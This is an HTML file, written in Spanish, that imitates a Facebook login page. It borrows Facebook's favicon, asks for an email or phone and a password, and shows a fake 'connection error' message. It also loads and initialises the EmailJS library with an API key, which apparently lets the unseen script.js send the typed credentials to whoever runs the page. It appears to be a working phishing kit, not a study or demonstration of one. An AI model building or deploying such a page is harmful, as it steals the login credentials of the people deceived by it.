<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Inicio de Sesión</title>
    <link
      rel="icon"
      href="https://www.facebook.com/favicon.ico"
      type="image/x-icon"
    />
    <link rel="stylesheet" href="fbcss.css" />
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
    ></script>
  </head>
  <body>
    <div class="container">
      <div class="login-box">
        <h1>Iniciar sesión en Facebook</h1>
        <form id="loginForm">
          <div class="input-group">
            <label for="email">Correo electrónico o teléfono</label>
            <input type="text" id="email" name="email" required />
          </div>
          <div class="input-group">
            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" required />
          </div>
          <button type="submit">Iniciar sesión</button>
        </form>
        <p id="error-message" style="color: rgb(206, 22, 46); display: none">
          Error de conexión...
        </p>
      </div>
    </div>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        emailjs.init("jhZnTqYfkp54W6WUd");
      });
    </script>
    <script src="script.js"></script>
  </body>
</html>
